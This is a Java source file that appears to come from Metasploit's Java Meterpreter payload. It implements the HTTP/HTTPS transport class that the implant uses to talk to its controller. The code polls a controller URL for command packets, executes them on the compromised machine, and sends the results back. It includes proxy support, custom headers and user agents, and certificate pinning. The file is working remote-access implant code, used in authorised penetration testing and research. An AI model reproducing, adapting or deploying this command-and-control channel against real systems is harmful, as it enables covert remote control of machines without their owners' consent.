package com.metasploit.meterpreter;

import com.metasploit.meterpreter.command.Command;
import com.metasploit.stage.HttpConnection;
import com.metasploit.stage.PayloadTrustManager;
import com.metasploit.stage.TransportConfig;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.OutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

public class HttpTransport extends Transport {

    private URL targetUrl = null;
    private URL nextUrl = null;
    private String userAgent;
    private String proxy;
    private String proxyUser;
    private String proxyPass;
    private String customHeaders;
    private byte[] certHash;

    public HttpTransport(Meterpreter met, String url) throws MalformedURLException {
        super(met, url);
        this.targetUrl = new URL(url);
    }

    public HttpTransport(Meterpreter met, String url, TransportConfig transportConfig) throws MalformedURLException {
        this(met, url);
        userAgent = transportConfig.user_agent;
        proxy = transportConfig.proxy;
        proxyUser = transportConfig.proxy_user;
        proxyPass = transportConfig.proxy_pass;
        certHash = transportConfig.cert_hash;
        customHeaders = transportConfig.custom_headers;
        setTimeouts(transportConfig);
    }

    @Override
    public void bind(DataInputStream in, OutputStream rawOut) {
        // http, we don't bind to anything as we're stateless
    }

    @Override
    public boolean switchUri(String uri) {
        try {
            // can't use getAuthority() here thanks to java 1.2. Ugh.
            String newUrl = this.targetUrl.getProtocol() + "://"
              + this.targetUrl.getHost() + ":"
              + this.targetUrl.getPort()
              + uri;
            this.nextUrl = new URL(newUrl);
            return true;
        }
        catch (MalformedURLException ex) {
          return false;
        }
    }

    public String getUserAgent() {
        return this.userAgent;
    }

    public void setUserAgent(String userAgent) {
        this.userAgent = userAgent;
    }

    public String getProxy() {
        return this.proxy;
    }

    public void setProxy(String proxy) {
        this.proxy = proxy;
    }

    public String getProxyUser() {
        return this.proxyUser;
    }

    public void setProxyUser(String proxyUser) {
        this.proxyUser = proxyUser;
    }

    public String getProxyPass() {
        return this.proxyPass;
    }

    public void setProxyPass(String proxyPass) {
        this.proxyPass = proxyPass;
    }

    public byte[] getCertHash() {
        return this.certHash;
    }

    public void setCertHash(byte[] certHash) {
        this.certHash = certHash;
    }

    public String getCustomHeaders() {
        return this.customHeaders;
    }

    @Override
    public void disconnect() {
    }

    @Override
    protected boolean tryConnect(Meterpreter met) throws IOException {
        URLConnection conn = this.createConnection();

        if (conn == null) {
            return false;
        }

        DataInputStream inputStream = new DataInputStream(conn.getInputStream());

        try {
            TLVPacket request = this.readAndDecodePacket(inputStream);
            inputStream.close();

            // things are looking good, handle the packet and return true, as this
            // is the situation that happens on initial connect (not reconnect)
            TLVPacket response = request.createResponse();
            int result = met.getCommandManager().executeCommand(met, request, response);
            if (result == Command.EXIT_DISPATCH) {
                return true;
            }
            this.writePacket(response, TLVPacket.PACKET_TYPE_RESPONSE);

            return true;
        }
        catch (EOFException ex) {
            // this can happens on reconnect
            return true;
        }
        catch (Exception ignored) {
        }

        // we get here, thins aren't good.
        return false;
    }

    @Override
    public TLVPacket readPacket() throws IOException {
        URLConnection conn = this.createConnection();

        if (conn == null) {
            return null;
        }

        DataInputStream inputStream = new DataInputStream(conn.getInputStream());

        try {
            TLVPacket request = this.readAndDecodePacket(inputStream);
            inputStream.close();
            return request;
        }
        catch (EOFException ignored) {
        }

        return null;
    }

    @Override
    public void writePacket(TLVPacket packet, int type) throws IOException {
        URLConnection conn = this.createConnection();

        if (conn == null) {
            return;
        }

        conn.setDoOutput(true);
        DataOutputStream outputStream = new DataOutputStream(conn.getOutputStream());
        this.encodePacketAndWrite(packet, type, outputStream);
        outputStream.close();

        DataInputStream inputStream = new DataInputStream(conn.getInputStream());

        try {
            this.readAndDecodePacket(inputStream);
            // not really worried about the response, we just want to read a packet out of it
            // and move on
            inputStream.close();
        }
        catch (EOFException ex) {
            // log error?
        }
    }

    @Override
    public boolean dispatch(Meterpreter met) {
        long lastPacket = System.currentTimeMillis();
        long ecount = 0;

        while (!met.hasSessionExpired() &&
            System.currentTimeMillis() < lastPacket + this.commTimeout) {
            try {
                useNextUrl();
                TLVPacket request = this.readPacket();

                if (request != null) {
                    ecount = 0;

                    // got a packet, update the timestamp
                    lastPacket = System.currentTimeMillis();

                    TLVPacket response = request.createResponse();
                    int result = met.getCommandManager().executeCommand(met, request, response);

                    // Make sure the UUID is baked into each response.
                    response.add(TLVType.TLV_TYPE_UUID, met.getUUID());

                    this.writePacket(response, TLVPacket.PACKET_TYPE_RESPONSE);

                    if (result == Command.EXIT_DISPATCH) {
                        return true;
                    }
                } else {
                    long delay = ecount++ * 10;
                    if (ecount >= 10) {
                        delay *= 10;
                    }
                    met.sleep(Math.min(10000, delay));
                }
            } catch (Exception ex) {
                // any other type of exception isn't good.
                break;
            }

        }

        // if we get here we assume things aren't good.
        return false;
    }

    private void useNextUrl() {
        // see if we switched URLs along the way, and if we did, move it on over.
        if (this.nextUrl != null) {
            this.url = this.nextUrl.toString();
            this.targetUrl = this.nextUrl;
            this.nextUrl = null;
        }
    }

    private URLConnection createConnection() {
        URLConnection conn = null;

        try {
            conn = this.targetUrl.openConnection();
            HttpConnection.addRequestHeaders(conn, customHeaders, userAgent);

            if (this.targetUrl.getProtocol().equals("https")) {
                try {
                    PayloadTrustManager.useFor(conn, certHash);
                } catch (Exception ex) {
                    // perhaps log?
                }
            }
        }
        catch (IOException ex) {
            if (conn != null) {
                conn = null;
            }
        }

        return conn;
    }
}

